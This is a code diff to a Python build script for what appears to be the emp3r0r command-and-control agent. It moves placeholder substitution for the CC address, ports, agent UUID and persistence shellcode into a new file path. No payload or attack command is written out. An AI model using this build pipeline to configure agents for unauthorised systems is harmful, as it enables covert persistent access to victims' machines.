@@ -151,37 +151,49 @@ class GoBuild:
         restore tags in the source
         '''
         # version
-        unsed("./lib/agent/def.go",
+        unsed("./lib/data/def.go",
               "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
         if self.target == "agent":
             # guardian shellcode
-            unsed("./lib/agent/def.go",
+            unsed("./lib/data/def.go",
                   "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
-            unsed("./lib/agent/def.go",
+            unsed("./lib/data/def.go",
                   "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
+
         # CA
         unsed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)
+
         # CC IP
-        unsed("./lib/agent/def.go",
+        unsed("./lib/data/def.go",
               "CCAddress = \"https://[cc_ipaddr]\"", f"CCAddress = \"https://{self.CCIP}\"")
+
         # agent root path
-        unsed("./lib/agent/def.go",
+        unsed("./lib/data/def.go",
               "AgentRoot = \"[agent_root]\"", f"AgentRoot = \"{self.AgentRoot}\"")
+
         # indicator
-        unsed("./lib/agent/def.go", "[cc_indicator]", self.INDICATOR)
+        unsed("./lib/data/def.go",
+              "CCIndicator = \"[cc_indicator]\"", f"CCIndicator = \"{self.INDICATOR}\"")
+
         # cc indicator text
-        unsed("./lib/agent/def.go",
+        unsed("./lib/data/def.go",
               "CCIndicatorText = \"[agent_cc_text]\"", f"CCIndicatorText = \"{self.INDICATOR_TEXT}\"")
+
         # agent UUID
-        unsed("./lib/agent/def.go", "[agent_uuid]", self.UUID)
+        unsed("./lib/data/def.go",
+              "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")
+
         # ports
-        unsed("./lib/agent/def.go",
+        unsed("./lib/data/def.go",
               "CCPort = \"[cc_port]\"", f"CCPort = \"{CACHED_CONF['cc_port']}\"")
-        unsed("./lib/agent/def.go",
+
+        unsed("./lib/data/def.go",
               "SSHDPort = \"[sshd_port]\"", f"SSHDPort = \"{CACHED_CONF['sshd_port']}\"")
-        unsed("./lib/agent/def.go",
+
+        unsed("./lib/data/def.go",
               "ProxyPort = \"[proxy_port]\"", f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"")
-        unsed("./lib/agent/def.go",
+
+        unsed("./lib/data/def.go",
               "BroadcastPort = \"[broadcast_port]\"", f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"")
 
     def set_tags(self):
@@ -190,37 +202,49 @@ class GoBuild:
         '''
 
         # version
-        sed("./lib/agent/def.go",
+        sed("./lib/data/def.go",
             "Version = \"[emp3r0r_version_string]\"", f"Version = \"{self.VERSION}\"")
         if self.target == "agent":
             # guardian shellcode
-            sed("./lib/agent/def.go",
+            sed("./lib/data/def.go",
                 "[persistence_shellcode]", CACHED_CONF['guardian_shellcode'])
-            sed("./lib/agent/def.go",
+            sed("./lib/data/def.go",
                 "[persistence_agent_path]", CACHED_CONF['guardian_agent_path'])
+
         # CA
         sed("./lib/tun/tls.go", "[emp3r0r_ca]", self.CA)
+
         # CC IP
-        sed("./lib/agent/def.go",
+        sed("./lib/data/def.go",
             "CCAddress = \"https://[cc_ipaddr]\"", f"CCAddress = \"https://{self.CCIP}\"")
+
         # agent root path
-        sed("./lib/agent/def.go",
+        sed("./lib/data/def.go",
             "AgentRoot = \"[agent_root]\"", f"AgentRoot = \"{self.AgentRoot}\"")
+
         # indicator
-        sed("./lib/agent/def.go", "[cc_indicator]", self.INDICATOR)
+        sed("./lib/data/def.go",
+            "CCIndicator = \"[cc_indicator]\"", f"CCIndicator = \"{self.INDICATOR}\"")
+
         # cc indicator text
-        sed("./lib/agent/def.go",
+        sed("./lib/data/def.go",
             "CCIndicatorText = \"[agent_cc_text]\"", f"CCIndicatorText = \"{self.INDICATOR_TEXT}\"")
+
         # agent UUID
-        sed("./lib/agent/def.go", "[agent_uuid]", self.UUID)
+        sed("./lib/data/def.go",
+            "AgentUUID = \"[agent_uuid]\"", f"AgentUUID = \"{self.UUID}\"")
+
         # ports
-        sed("./lib/agent/def.go",
+        sed("./lib/data/def.go",
             "CCPort = \"[cc_port]\"", f"CCPort = \"{CACHED_CONF['cc_port']}\"")
-        sed("./lib/agent/def.go",
+
+        sed("./lib/data/def.go",
             "SSHDPort = \"[sshd_port]\"", f"SSHDPort = \"{CACHED_CONF['sshd_port']}\"")
-        sed("./lib/agent/def.go",
+
+        sed("./lib/data/def.go",
             "ProxyPort = \"[proxy_port]\"", f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"")
-        sed("./lib/agent/def.go",
+
+        sed("./lib/data/def.go",
             "BroadcastPort = \"[broadcast_port]\"", f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"")
 
 
